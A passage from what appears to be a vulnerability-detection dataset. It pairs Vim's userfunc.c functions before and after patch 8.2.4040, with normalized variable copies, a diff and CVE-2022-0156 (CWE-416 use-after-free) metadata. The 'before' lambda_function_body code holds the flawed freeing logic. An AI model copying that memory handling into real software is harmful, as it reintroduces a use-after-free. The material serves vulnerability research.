		if (p == arg)
		    break;
		if (*skipwhite(p) == '=')
		{
		    emsg(_(e_cannot_use_default_for_variable_arguments));
		    break;
		}
	    }
	}
	else
	{
	    char_u *np;

	    arg = p;
	    p = one_function_arg(p, newargs, argtypes, types_optional,
							 evalarg, FALSE, skip);
	    if (p == arg)
		break;

	    // Recognize "" = expr"" but not "" == expr"".  A lambda can have
	    // ""(a = expr"" but ""(a == expr"" and ""(a =~ expr"" are not a lambda.
	    np = skipwhite(p);
	    if (*np == '=' && np[1] != '=' && np[1] != '~'
						       && default_args != NULL)
	    {
		typval_T	rettv;

		// find the end of the expression (doesn't evaluate it)
		any_default = TRUE;
		p = skipwhite(p) + 1;
		whitep = p;
		p = skipwhite(p);
		expr = p;
		if (eval1(&p, &rettv, NULL) != FAIL)
		{
		    if (!skip)
		    {
			if (ga_grow(default_args, 1) == FAIL)
			    goto err_ret;

			// trim trailing whitespace
			while (p > expr && VIM_ISWHITE(p[-1]))
			    p--;
			c = *p;
			*p = NUL;
			expr = vim_strsave(expr);
			if (expr == NULL)
			{
			    *p = c;
			    goto err_ret;
			}
			((char_u **)(default_args->ga_data))
						 [default_args->ga_len] = expr;
			default_args->ga_len++;
			*p = c;
		    }
		}
		else
		    mustend = TRUE;
	    }
	    else if (any_default)
	    {
		emsg(_(e_non_default_argument_follows_default_argument));
		goto err_ret;
	    }

	    if (VIM_ISWHITE(*p) && *skipwhite(p) == ',')
	    {
		// Be tolerant when skipping
		if (!skip)
		{
		    semsg(_(e_no_white_space_allowed_before_str_str), "","", p);
		    goto err_ret;
		}
		p = skipwhite(p);
	    }
	    if (*p == ',')
	    {
		++p;
		// Don't give this error when skipping, it makes the ""->"" not
		// found in ""{k,v -> x}"" and give a confusing error.
		// Allow missing space after comma in legacy functions.
		if (!skip && argtypes != NULL
				      && !IS_WHITE_OR_NUL(*p) && *p != endchar)
		{
		    semsg(_(e_white_space_required_after_str_str), "","", p - 1);
		    goto err_ret;
		}
	    }
	    else
		mustend = TRUE;
	}
	whitep = p;
	p = skipwhite(p);
    }

    if (*p != endchar)
	goto err_ret;
    ++p;	// skip ""endchar""

    *argp = p;
    return OK;

err_ret:
    if (newargs != NULL)
	ga_clear_strings(newargs);
    if (!skip && default_args != NULL)
	ga_clear_strings(default_args);
    return FAIL;
}","static int
get_function_args(
    char_u	**VAR_0,
    char_u	VAR_1,
    garray_T	*VAR_2,
    garray_T	*VAR_3,	/* COMMENT_0 */
    int		VAR_4,	/* COMMENT_1 */
    evalarg_T	*VAR_5,	/* COMMENT_2 */
    int		*VAR_6,
    garray_T	*VAR_7,
    int		VAR_8,
    exarg_T	*VAR_9,
    garray_T	*VAR_10)
{
    int		VAR_11 = FALSE;
    char_u	*VAR_12;
    char_u	*VAR_13;
    int		VAR_14;
    int		VAR_15 = FALSE;
    char_u	*VAR_16;
    char_u	*VAR_17 = *VAR_0;

    if (VAR_2 != NULL)
	ga_init2(VAR_2, (int)sizeof(char_u *), 3);
    if (VAR_3 != NULL)
	ga_init2(VAR_3, (int)sizeof(char_u *), 3);
    if (!VAR_8 && VAR_7 != NULL)
	ga_init2(VAR_7, (int)sizeof(char_u *), 3);

    if (VAR_6 != NULL)
	*VAR_6 = FALSE;

    /* COMMENT_3 */
                                                
       
    VAR_12 = skipwhite(*VAR_0);
    VAR_13 = VAR_12;
    while (*VAR_13 != VAR_1)
    {
	while (VAR_9 != NULL && VAR_9->getline != NULL
			 && (*VAR_13 == VAR_18 || (VIM_ISWHITE(*VAR_17) && *VAR_13 == '#')))
	{
	    /* COMMENT_6 */
	    char_u *VAR_19 = get_function_line(VAR_9, VAR_10, 0,
							  VAR_20);

	    if (VAR_19 == NULL)
		break;
	    VAR_17 = (char_u *)"" "";
	    VAR_13 = skipwhite(VAR_19);
	}

	if (VAR_11 && *VAR_13 != VAR_1)
	{
	    if (!VAR_8)
		semsg(_(VAR_21), *VAR_0);
	    goto err_ret;
	}
	if (*VAR_13 == VAR_1)
	    break;

	if (VAR_13[0] == '.' && VAR_13[1] == '.' && VAR_13[2] == '.')
	{
	    if (VAR_6 != NULL)
		*VAR_6 = TRUE;
	    VAR_13 += 3;
	    VAR_11 = TRUE;

	    if (VAR_3 != NULL)
	    {
		/* COMMENT_7 */
		if (!eval_isnamec1(*VAR_13))
		{
		    if (!VAR_8)
			emsg(_(VAR_22));
		    goto err_ret;
		}

		VAR_12 = VAR_13;
		VAR_13 = one_function_arg(VAR_13, VAR_2, VAR_3, VAR_4,
							  VAR_5, TRUE, VAR_8);
		if (VAR_13 == VAR_12)
		    break;
		if (*skipwhite(VAR_13) == '=')
		{
		    emsg(_(VAR_23));
		    break;
		}
	    }
	}
	else
	{
	    char_u *VAR_24;

	    VAR_12 = VAR_13;
	    VAR_13 = one_function_arg(VAR_13, VAR_2, VAR_3, VAR_4,
							 VAR_5, FALSE, VAR_8);
	    if (VAR_13 == VAR_12)
		break;

	    /* COMMENT_8 */
	    /* COMMENT_9 */
	    VAR_24 = skipwhite(VAR_13);
	    if (*VAR_24 == '=' && VAR_24[1] != '=' && VAR_24[1] != '~'
						       && VAR_7 != NULL)
	    {
		typval_T	VAR_25;

		/* COMMENT_10 */
		VAR_15 = TRUE;
		VAR_13 = skipwhite(VAR_13) + 1;
		VAR_17 = VAR_13;
		VAR_13 = skipwhite(VAR_13);
		VAR_16 = VAR_13;
		if (eval1(&VAR_13, &VAR_25, NULL) != VAR_26)
		{
		    if (!VAR_8)
		    {
			if (ga_grow(VAR_7, 1) == VAR_26)
			    goto err_ret;

			/* COMMENT_11 */
			while (VAR_13 > VAR_16 && VIM_ISWHITE(VAR_13[-1]))
			    VAR_13--;
			VAR_14 = *VAR_13;
			*VAR_13 = VAR_18;
			VAR_16 = vim_strsave(VAR_16);
			if (VAR_16 == NULL)
			{
			    *VAR_13 = VAR_14;
			    goto err_ret;
			}
			((char_u **)(VAR_7->ga_data))
						 [VAR_7->ga_len] = VAR_16;
			VAR_7->ga_len++;
			*VAR_13 = VAR_14;
		    }
		}
		else
		    VAR_11 = TRUE;
	    }
	    else if (VAR_15)
	    {
		emsg(_(VAR_27));
		goto err_ret;
	    }

	    if (VIM_ISWHITE(*VAR_13) && *skipwhite(VAR_13) == ',')
	    {
		/* COMMENT_12 */
		if (!VAR_8)
		{
		    semsg(_(VAR_28), "","", VAR_13);
		    goto err_ret;
		}
		VAR_13 = skipwhite(VAR_13);
	    }
	    if (*VAR_13 == ',')
	    {
		++VAR_13;
		/* COMMENT_13 */
		/* COMMENT_14 */
		/* COMMENT_15 */
		if (!VAR_8 && VAR_3 != NULL
				      && !IS_WHITE_OR_NUL(*VAR_13) && *VAR_13 != VAR_1)
		{
		    semsg(_(VAR_29), "","", VAR_13 - 1);
		    goto err_ret;
		}
	    }
	    else
		VAR_11 = TRUE;
	}
	VAR_17 = VAR_13;
	VAR_13 = skipwhite(VAR_13);
    }

    if (*VAR_13 != VAR_1)
	goto err_ret;
    ++VAR_13;	/* COMMENT_16 */

    *VAR_0 = VAR_13;
    return VAR_30;

err_ret:
    if (VAR_2 != NULL)
	ga_clear_strings(VAR_2);
    if (!VAR_8 && VAR_7 != NULL)
	ga_clear_strings(VAR_7);
    return VAR_26;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -10,7 +10,7 @@
     garray_T	*default_args,
     int		skip,
     exarg_T	*eap,
-    char_u	**line_to_free)
+    garray_T	*lines_to_free)
 {
     int		mustend = FALSE;
     char_u	*arg;
@@ -41,7 +41,7 @@
 			 && (*p == NUL || (VIM_ISWHITE(*whitep) && *p == '#')))
 	{
 	    // End of the line, get the next one.
-	    char_u *theline = get_function_line(eap, line_to_free, 0,
+	    char_u *theline = get_function_line(eap, lines_to_free, 0,
 							  GETLINE_CONCAT_CONT);
 
 	    if (theline == NULL)","{'deleted_lines': ['    char_u\t**line_to_free)', '\t    char_u *theline = get_function_line(eap, line_to_free, 0,'], 'added_lines': ['    garray_T\t*lines_to_free)', '\t    char_u *theline = get_function_line(eap, lines_to_free, 0,']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/userfunc.c,lambda_function_body,"static int
lambda_function_body(
char_u    **arg,
typval_T    *rettv,
evalarg_T   *evalarg,
garray_T    *newargs,
garray_T    *argtypes,
int    varargs,
garray_T    *default_args,
char_u    *ret_type)
{
intevaluate = (evalarg->eval_flags & EVAL_EVALUATE);
garray_T*gap = &evalarg->eval_ga;
garray_T*freegap = &evalarg->eval_freega;
ufunc_T*ufunc = NULL;
exarg_Teap;
garray_Tnewlines;
char_u*cmdline = NULL;
intret = FAIL;
char_u*line_to_free = NULL;
partial_T*pt;
char_u*name;
intlnum_save = -1;
linenr_Tsourcing_lnum_top = SOURCING_LNUM;
if (!ends_excmd2(*arg, skipwhite(*arg + 1)))
{
semsg(_(e_trailing_characters_str), *arg + 1);
return FAIL;
}
CLEAR_FIELD(eap);
eap.cmdidx = CMD_block;
eap.forceit = FALSE;
eap.cmdlinep = &cmdline;
eap.skip = !evaluate;
if (evalarg->eval_cctx != NULL)
fill_exarg_from_cctx(&eap, evalarg->eval_cctx);
else
{
eap.getline = evalarg->eval_getline;
eap.cookie = evalarg->eval_cookie;
}
ga_init2(&newlines, (int)sizeof(char_u *), 10);
if (get_function_body(&eap, &newlines, NULL, &line_to_free) == FAIL)
{
if (cmdline != line_to_free)
vim_free(cmdline);
goto erret;
}
evalarg->eval_break_count += newlines.ga_len;
if (gap->ga_itemsize > 0)
{
intidx;
char_u*last;
size_t  plen;
char_u  *pnl;
for (idx = 0; idx < newlines.ga_len; ++idx)
{
char_u  *p = skipwhite(((char_u **)newlines.ga_data)[idx]);
if (ga_grow(gap, 1) == FAIL || ga_grow(freegap, 1) == FAIL)
goto erret;
if (*p == NUL || vim9_comment_start(p))
p = (char_u *)"""";
plen = STRLEN(p);
pnl = vim_strnsave((char_u *)""\n"", plen + 1);
if (pnl != NULL)
mch_memmove(pnl + 1, p, plen + 1);
((char_u **)gap->ga_data)[gap->ga_len++] = pnl;
((char_u **)freegap->ga_data)[freegap->ga_len++] = pnl;
}
if (ga_grow(gap, 1) == FAIL || ga_grow(freegap, 1) == FAIL)
goto erret;
if (eap.nextcmd != NULL)
last = cmdline;
else
last = (char_u *)""}"";
plen = STRLEN(last);
pnl = vim_strnsave((char_u *)""\n"", plen + 1);
if (pnl != NULL)
mch_memmove(pnl + 1, last, plen + 1);
((char_u **)gap->ga_data)[gap->ga_len++] = pnl;
((char_u **)freegap->ga_data)[freegap->ga_len++] = pnl;
}
if (eap.nextcmd != NULL)
{
garray_T *tfgap = &evalarg->eval_tofree_ga;
*arg = eap.nextcmd;
if (ga_grow(tfgap, 1) == OK)
{
((char_u **)(tfgap->ga_data))[tfgap->ga_len++] = cmdline;
evalarg->eval_using_cmdline = TRUE;
if (cmdline == line_to_free)
line_to_free = NULL;
}
}
else
*arg = (char_u *)"""";
if (!evaluate)
{
ret = OK;
goto erret;
}
name = get_lambda_name();
ufunc = alloc_clear(offsetof(ufunc_T, uf_name) + STRLEN(name) + 1);
if (ufunc == NULL)
goto erret;
set_ufunc_name(ufunc, name);
if (hash_add(&func_hashtab, UF2HIKEY(ufunc)) == FAIL)
goto erret;
ufunc->uf_flags = FC_LAMBDA;
ufunc->uf_refcount = 1;
ufunc->uf_args = *newargs;
newargs->ga_data = NULL;
ufunc->uf_def_args = *default_args;
default_args->ga_data = NULL;
ufunc->uf_func_type = &t_func_any;
lnum_save = SOURCING_LNUM;
SOURCING_LNUM = sourcing_lnum_top;
if (parse_argument_types(ufunc, argtypes, varargs) == FAIL)
{
SOURCING_LNUM = lnum_save;
goto erret;
}
if (parse_return_type(ufunc, ret_type) == FAIL)
goto erret;
pt = ALLOC_CLEAR_ONE(partial_T);
if (pt == NULL)
goto erret;
pt->pt_func = ufunc;
pt->pt_refcount = 1;
ufunc->uf_lines = newlines;
newlines.ga_data = NULL;
if (sandbox)
ufunc->uf_flags |= FC_SANDBOX;
if (!ASCII_ISUPPER(*ufunc->uf_name))
ufunc->uf_flags |= FC_VIM9;
ufunc->uf_script_ctx = current_sctx;
ufunc->uf_script_ctx_version = current_sctx.sc_version;
ufunc->uf_script_ctx.sc_lnum += sourcing_lnum_top;
set_function_type(ufunc);
function_using_block_scopes(ufunc, evalarg->eval_cstack);
rettv->vval.v_partial = pt;
rettv->v_type = VAR_PARTIAL;
ufunc = NULL;
ret = OK;
erret:
if (lnum_save >= 0)
SOURCING_LNUM = lnum_save;
vim_free(line_to_free);
ga_clear_strings(&newlines);
if (newargs != NULL)
ga_clear_strings(newargs);
ga_clear_strings(default_args);
if (ufunc != NULL)
{
func_clear(ufunc, TRUE);
func_free(ufunc, TRUE);
}
return ret;
}","static int
lambda_function_body(
char_u    **VAR_0,
typval_T    *VAR_1,
evalarg_T   *VAR_2,
garray_T    *VAR_3,
garray_T    *VAR_4,
int    VAR_5,
garray_T    *VAR_6,
char_u    *VAR_7)
{
intVAR_8 = (VAR_2->eval_flags & VAR_9);
garray_T*VAR_10 = &VAR_2->eval_ga;
garray_T*VAR_11 = &VAR_2->eval_freega;
ufunc_T*VAR_12 = NULL;
exarg_TVAR_13;
garray_TVAR_14;
char_u*VAR_15 = NULL;
intVAR_16 = VAR_17;
char_u*VAR_18 = NULL;
partial_T*VAR_19;
char_u*VAR_20;
intVAR_21 = -1;
linenr_TVAR_22 = VAR_23;
if (!ends_excmd2(*VAR_0, skipwhite(*VAR_0 + 1)))
{
semsg(_(VAR_24), *VAR_0 + 1);
return VAR_17;
}
CLEAR_FIELD(VAR_13);
VAR_13.cmdidx = VAR_25;
VAR_13.forceit = FALSE;
VAR_13.cmdlinep = &VAR_15;
VAR_13.skip = !VAR_8;
if (VAR_2->eval_cctx != NULL)
fill_exarg_from_cctx(&VAR_13, VAR_2->eval_cctx);
else
{
VAR_13.getline = VAR_2->eval_getline;
VAR_13.cookie = VAR_2->eval_cookie;
}
ga_init2(&VAR_14, (int)sizeof(char_u *), 10);
if (get_function_body(&VAR_13, &VAR_14, NULL, &VAR_18) == VAR_17)
{
if (VAR_15 != VAR_18)
vim_free(VAR_15);
goto erret;
}
VAR_2->eval_break_count += VAR_14.ga_len;
if (VAR_10->ga_itemsize > 0)
{
intVAR_26;
char_u*VAR_27;
size_t  VAR_28;
char_u  *VAR_29;
for (VAR_26 = 0; VAR_26 < VAR_14.ga_len; ++VAR_26)
{
char_u  *VAR_30 = skipwhite(((char_u **)VAR_14.ga_data)[VAR_26]);
if (ga_grow(VAR_10, 1) == VAR_17 || ga_grow(VAR_11, 1) == VAR_17)
goto erret;
if (*VAR_30 == VAR_31 || vim9_comment_start(VAR_30))
VAR_30 = (char_u *)"""";
VAR_28 = STRLEN(VAR_30);
VAR_29 = vim_strnsave((char_u *)""\n"", VAR_28 + 1);
if (VAR_29 != NULL)
mch_memmove(VAR_29 + 1, VAR_30, VAR_28 + 1);
((char_u **)VAR_10->ga_data)[VAR_10->ga_len++] = VAR_29;
((char_u **)VAR_11->ga_data)[VAR_11->ga_len++] = VAR_29;
}
if (ga_grow(VAR_10, 1) == VAR_17 || ga_grow(VAR_11, 1) == VAR_17)
goto erret;
if (VAR_13.nextcmd != NULL)
VAR_27 = VAR_15;
else
VAR_27 = (char_u *)""}"";
VAR_28 = STRLEN(VAR_27);
VAR_29 = vim_strnsave((char_u *)""\n"", VAR_28 + 1);
if (VAR_29 != NULL)
mch_memmove(VAR_29 + 1, VAR_27, VAR_28 + 1);
((char_u **)VAR_10->ga_data)[VAR_10->ga_len++] = VAR_29;
((char_u **)VAR_11->ga_data)[VAR_11->ga_len++] = VAR_29;
}
if (VAR_13.nextcmd != NULL)
{
garray_T *VAR_32 = &VAR_2->eval_tofree_ga;
*VAR_0 = VAR_13.nextcmd;
if (ga_grow(VAR_32, 1) == VAR_33)
{
((char_u **)(VAR_32->ga_data))[VAR_32->ga_len++] = VAR_15;
VAR_2->eval_using_cmdline = TRUE;
if (VAR_15 == VAR_18)
VAR_18 = NULL;
}
}
else
*VAR_0 = (char_u *)"""";
if (!VAR_8)
{
VAR_16 = VAR_33;
goto erret;
}
VAR_20 = get_lambda_name();
VAR_12 = alloc_clear(offsetof(ufunc_T, VAR_34) + STRLEN(VAR_20) + 1);
if (VAR_12 == NULL)
goto erret;
set_ufunc_name(VAR_12, VAR_20);
if (hash_add(&VAR_35, UF2HIKEY(VAR_12)) == VAR_17)
goto erret;
VAR_12->uf_flags = VAR_36;
VAR_12->uf_refcount = 1;
VAR_12->uf_args = *VAR_3;
VAR_3->ga_data = NULL;
VAR_12->uf_def_args = *VAR_6;
VAR_6->ga_data = NULL;
VAR_12->uf_func_type = &VAR_37;
VAR_21 = VAR_23;
VAR_23 = VAR_22;
if (parse_argument_types(VAR_12, VAR_4, VAR_5) == VAR_17)
{
VAR_23 = VAR_21;
goto erret;
}
if (parse_return_type(VAR_12, VAR_7) == VAR_17)
goto erret;
VAR_19 = ALLOC_CLEAR_ONE(partial_T);
if (VAR_19 == NULL)
goto erret;
VAR_19->pt_func = VAR_12;
VAR_19->pt_refcount = 1;
VAR_12->uf_lines = VAR_14;
VAR_14.ga_data = NULL;
if (VAR_38)
VAR_12->uf_flags |= VAR_39;
if (!ASCII_ISUPPER(*VAR_12->uf_name))
VAR_12->uf_flags |= VAR_40;
VAR_12->uf_script_ctx = VAR_41;
VAR_12->uf_script_ctx_version = VAR_41.sc_version;
VAR_12->uf_script_ctx.sc_lnum += VAR_22;
set_function_type(VAR_12);
function_using_block_scopes(VAR_12, VAR_2->eval_cstack);
VAR_1->vval.v_partial = VAR_19;
VAR_1->v_type = VAR_42;
VAR_12 = NULL;
VAR_16 = VAR_33;
erret:
if (VAR_21 >= 0)
VAR_23 = VAR_21;
vim_free(VAR_18);
ga_clear_strings(&VAR_14);
if (VAR_3 != NULL)
ga_clear_strings(VAR_3);
ga_clear_strings(VAR_6);
if (VAR_12 != NULL)
{
func_clear(VAR_12, TRUE);
func_free(VAR_12, TRUE);
}
return VAR_16;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/before/1.json,"static int
lambda_function_body(
	char_u	    **arg,
	typval_T    *rettv,
	evalarg_T   *evalarg,
	garray_T    *newargs,
	garray_T    *argtypes,
	int	    varargs,
	garray_T    *default_args,
	char_u	    *ret_type)
{
    int		evaluate = (evalarg->eval_flags & EVAL_EVALUATE);
    garray_T	*gap = &evalarg->eval_ga;
    garray_T	*freegap = &evalarg->eval_freega;
    ufunc_T	*ufunc = NULL;
    exarg_T	eap;
    garray_T	newlines;
    char_u	*cmdline = NULL;
    int		ret = FAIL;
    partial_T	*pt;
    char_u	*name;
    int		lnum_save = -1;
    linenr_T	sourcing_lnum_top = SOURCING_LNUM;

    if (!ends_excmd2(*arg, skipwhite(*arg + 1)))
    {
	semsg(_(e_trailing_characters_str), *arg + 1);
	return FAIL;
    }

    CLEAR_FIELD(eap);
    eap.cmdidx = CMD_block;
    eap.forceit = FALSE;
    eap.cmdlinep = &cmdline;
    eap.skip = !evaluate;
    if (evalarg->eval_cctx != NULL)
	fill_exarg_from_cctx(&eap, evalarg->eval_cctx);
    else
    {
	eap.getline = evalarg->eval_getline;
	eap.cookie = evalarg->eval_cookie;
    }

    ga_init2(&newlines, (int)sizeof(char_u *), 10);
    if (get_function_body(&eap, &newlines, NULL,
					     &evalarg->eval_tofree_ga) == FAIL)
	goto erret;

    // When inside a lambda must add the function lines to evalarg.eval_ga.
    evalarg->eval_break_count += newlines.ga_len;
    if (gap->ga_itemsize > 0)
    {
	int	idx;
	char_u	*last;
	size_t  plen;
	char_u  *pnl;

	for (idx = 0; idx < newlines.ga_len; ++idx)
	{
	    char_u  *p = skipwhite(((char_u **)newlines.ga_data)[idx]);

	    if (ga_grow(gap, 1) == FAIL || ga_grow(freegap, 1) == FAIL)
		goto erret;

	    // Going to concatenate the lines after parsing.  For an empty or
	    // comment line use an empty string.
	    // Insert NL characters at the start of each line, the string will
	    // be split again later in .get_lambda_tv().
	    if (*p == NUL || vim9_comment_start(p))
		p = (char_u *)"""";
	    plen = STRLEN(p);
	    pnl = vim_strnsave((char_u *)""\n"", plen + 1);
	    if (pnl != NULL)
		mch_memmove(pnl + 1, p, plen + 1);
	    ((char_u **)gap->ga_data)[gap->ga_len++] = pnl;
	    ((char_u **)freegap->ga_data)[freegap->ga_len++] = pnl;
	}
	if (ga_grow(gap, 1) == FAIL || ga_grow(freegap, 1) == FAIL)
	    goto erret;
	if (eap.nextcmd != NULL)
	    // more is following after the ""}"", which was skipped
	    last = cmdline;
	else
	    // nothing is following the ""}""
	    last = (char_u *)""}"";
	plen = STRLEN(last);
	pnl = vim_strnsave((char_u *)""\n"", plen + 1);
	if (pnl != NULL)
	    mch_memmove(pnl + 1, last, plen + 1);
	((char_u **)gap->ga_data)[gap->ga_len++] = pnl;
	((char_u **)freegap->ga_data)[freegap->ga_len++] = pnl;
    }

    if (eap.nextcmd != NULL)
    {
	garray_T *tfgap = &evalarg->eval_tofree_ga;

	// Something comes after the ""}"".
	*arg = eap.nextcmd;

	// ""arg"" points into cmdline, need to keep the line and free it later.
	if (ga_grow(tfgap, 1) == OK)
	{
	    ((char_u **)(tfgap->ga_data))[tfgap->ga_len++] = cmdline;
	    evalarg->eval_using_cmdline = TRUE;
	}
    }
    else
	*arg = (char_u *)"""";

    if (!evaluate)
    {
	ret = OK;
	goto erret;
    }

    name = get_lambda_name();
    ufunc = alloc_clear(offsetof(ufunc_T, uf_name) + STRLEN(name) + 1);
    if (ufunc == NULL)
	goto erret;
    set_ufunc_name(ufunc, name);
    if (hash_add(&func_hashtab, UF2HIKEY(ufunc)) == FAIL)
	goto erret;
    ufunc->uf_flags = FC_LAMBDA;
    ufunc->uf_refcount = 1;
    ufunc->uf_args = *newargs;
    newargs->ga_data = NULL;
    ufunc->uf_def_args = *default_args;
    default_args->ga_data = NULL;
    ufunc->uf_func_type = &t_func_any;

    // error messages are for the first function line
    lnum_save = SOURCING_LNUM;
    SOURCING_LNUM = sourcing_lnum_top;

    // parse argument types
    if (parse_argument_types(ufunc, argtypes, varargs) == FAIL)
    {
	SOURCING_LNUM = lnum_save;
	goto erret;
    }

    // parse the return type, if any
    if (parse_return_type(ufunc, ret_type) == FAIL)
	goto erret;

    pt = ALLOC_CLEAR_ONE(partial_T);
    if (pt == NULL)
	goto erret;
    pt->pt_func = ufunc;
    pt->pt_refcount = 1;

    ufunc->uf_lines = newlines;
    newlines.ga_data = NULL;
    if (sandbox)
	ufunc->uf_flags |= FC_SANDBOX;
    if (!ASCII_ISUPPER(*ufunc->uf_name))
	ufunc->uf_flags |= FC_VIM9;
    ufunc->uf_script_ctx = current_sctx;
    ufunc->uf_script_ctx_version = current_sctx.sc_version;
    ufunc->uf_script_ctx.sc_lnum += sourcing_lnum_top;
    set_function_type(ufunc);

    function_using_block_scopes(ufunc, evalarg->eval_cstack);

    rettv->vval.v_partial = pt;
    rettv->v_type = VAR_PARTIAL;
    ufunc = NULL;
    ret = OK;

erret:
    if (lnum_save >= 0)
	SOURCING_LNUM = lnum_save;
    ga_clear_strings(&newlines);
    if (newargs != NULL)
	ga_clear_strings(newargs);
    ga_clear_strings(default_args);
    if (ufunc != NULL)
    {
	func_clear(ufunc, TRUE);
	func_free(ufunc, TRUE);
    }
    return ret;
}","static int
lambda_function_body(
	char_u	    **VAR_0,
	typval_T    *VAR_1,
	evalarg_T   *VAR_2,
	garray_T    *VAR_3,
	garray_T    *VAR_4,
	int	    VAR_5,
	garray_T    *VAR_6,
	char_u	    *VAR_7)
{
    int		VAR_8 = (VAR_2->eval_flags & VAR_9);
    garray_T	*VAR_10 = &VAR_2->eval_ga;
    garray_T	*VAR_11 = &VAR_2->eval_freega;
    ufunc_T	*VAR_12 = NULL;
    exarg_T	VAR_13;
    garray_T	VAR_14;
    char_u	*VAR_15 = NULL;
    int		VAR_16 = VAR_17;
    partial_T	*VAR_18;
    char_u	*VAR_19;
    int		VAR_20 = -1;
    linenr_T	VAR_21 = VAR_22;

    if (!ends_excmd2(*VAR_0, skipwhite(*VAR_0 + 1)))
    {
	semsg(_(VAR_23), *VAR_0 + 1);
	return VAR_17;
    }

    CLEAR_FIELD(VAR_13);
    VAR_13.cmdidx = VAR_24;
    VAR_13.forceit = FALSE;
    VAR_13.cmdlinep = &VAR_15;
    VAR_13.skip = !VAR_8;
    if (VAR_2->eval_cctx != NULL)
	fill_exarg_from_cctx(&VAR_13, VAR_2->eval_cctx);
    else
    {
	VAR_13.getline = VAR_2->eval_getline;
	VAR_13.cookie = VAR_2->eval_cookie;
    }

    ga_init2(&VAR_14, (int)sizeof(char_u *), 10);
    if (get_function_body(&VAR_13, &VAR_14, NULL,
					     &VAR_2->eval_tofree_ga) == VAR_17)
	goto erret;

    /* COMMENT_0 */
    VAR_2->eval_break_count += VAR_14.ga_len;
    if (VAR_10->ga_itemsize > 0)
    {
	int	VAR_25;
	char_u	*VAR_26;
	size_t  VAR_27;
	char_u  *VAR_28;

	for (VAR_25 = 0; VAR_25 < VAR_14.ga_len; ++VAR_25)
	{
	    char_u  *VAR_29 = skipwhite(((char_u **)VAR_14.ga_data)[VAR_25]);

	    if (ga_grow(VAR_10, 1) == VAR_17 || ga_grow(VAR_11, 1) == VAR_17)
		goto erret;

	    /* COMMENT_1 */
	    /* COMMENT_2 */
	    /* COMMENT_3 */
	    /* COMMENT_4 */
	    if (*VAR_29 == VAR_30 || vim9_comment_start(VAR_29))
		VAR_29 = (char_u *)"""";
	    VAR_27 = STRLEN(VAR_29);
	    VAR_28 = vim_strnsave((char_u *)""\n"", VAR_27 + 1);
	    if (VAR_28 != NULL)
		mch_memmove(VAR_28 + 1, VAR_29, VAR_27 + 1);
	    ((char_u **)VAR_10->ga_data)[VAR_10->ga_len++] = VAR_28;
	    ((char_u **)VAR_11->ga_data)[VAR_11->ga_len++] = VAR_28;
	}
	if (ga_grow(VAR_10, 1) == VAR_17 || ga_grow(VAR_11, 1) == VAR_17)
	    goto erret;
	if (VAR_13.nextcmd != NULL)
	    /* COMMENT_5 */
	    VAR_26 = VAR_15;
	else
	    /* COMMENT_6 */
	    VAR_26 = (char_u *)""}"";
	VAR_27 = STRLEN(VAR_26);
	VAR_28 = vim_strnsave((char_u *)""\n"", VAR_27 + 1);
	if (VAR_28 != NULL)
	    mch_memmove(VAR_28 + 1, VAR_26, VAR_27 + 1);
	((char_u **)VAR_10->ga_data)[VAR_10->ga_len++] = VAR_28;
	((char_u **)VAR_11->ga_data)[VAR_11->ga_len++] = VAR_28;
    }

    if (VAR_13.nextcmd != NULL)
    {
	garray_T *VAR_31 = &VAR_2->eval_tofree_ga;

	/* COMMENT_7 */
	*VAR_0 = VAR_13.nextcmd;

	/* COMMENT_8 */
	if (ga_grow(VAR_31, 1) == VAR_32)
	{
	    ((char_u **)(VAR_31->ga_data))[VAR_31->ga_len++] = VAR_15;
	    VAR_2->eval_using_cmdline = TRUE;
	}
    }
    else
	*VAR_0 = (char_u *)"""";

    if (!VAR_8)
    {
	VAR_16 = VAR_32;
	goto erret;
    }

    VAR_19 = get_lambda_name();
    VAR_12 = alloc_clear(offsetof(ufunc_T, VAR_33) + STRLEN(VAR_19) + 1);
    if (VAR_12 == NULL)
	goto erret;
    set_ufunc_name(VAR_12, VAR_19);
    if (hash_add(&VAR_34, UF2HIKEY(VAR_12)) == VAR_17)
	goto erret;
    VAR_12->uf_flags = VAR_35;
    VAR_12->uf_refcount = 1;
    VAR_12->uf_args = *VAR_3;
    VAR_3->ga_data = NULL;
    VAR_12->uf_def_args = *VAR_6;
    VAR_6->ga_data = NULL;
    VAR_12->uf_func_type = &VAR_36;

    /* COMMENT_9 */
    VAR_20 = VAR_22;
    VAR_22 = VAR_21;

    /* COMMENT_10 */
    if (parse_argument_types(VAR_12, VAR_4, VAR_5) == VAR_17)
    {
	VAR_22 = VAR_20;
	goto erret;
    }

    /* COMMENT_11 */
    if (parse_return_type(VAR_12, VAR_7) == VAR_17)
	goto erret;

    VAR_18 = ALLOC_CLEAR_ONE(partial_T);
    if (VAR_18 == NULL)
	goto erret;
    VAR_18->pt_func = VAR_12;
    VAR_18->pt_refcount = 1;

    VAR_12->uf_lines = VAR_14;
    VAR_14.ga_data = NULL;
    if (VAR_37)
	VAR_12->uf_flags |= VAR_38;
    if (!ASCII_ISUPPER(*VAR_12->uf_name))
	VAR_12->uf_flags |= VAR_39;
    VAR_12->uf_script_ctx = VAR_40;
    VAR_12->uf_script_ctx_version = VAR_40.sc_version;
    VAR_12->uf_script_ctx.sc_lnum += VAR_21;
    set_function_type(VAR_12);

    function_using_block_scopes(VAR_12, VAR_2->eval_cstack);

    VAR_1->vval.v_partial = VAR_18;
    VAR_1->v_type = VAR_41;
    VAR_12 = NULL;
    VAR_16 = VAR_32;

erret:
    if (VAR_20 >= 0)
	VAR_22 = VAR_20;
    ga_clear_strings(&VAR_14);
    if (VAR_3 != NULL)
	ga_clear_strings(VAR_3);
    ga_clear_strings(VAR_6);
    if (VAR_12 != NULL)
    {
	func_clear(VAR_12, TRUE);
	func_free(VAR_12, TRUE);
    }
    return VAR_16;
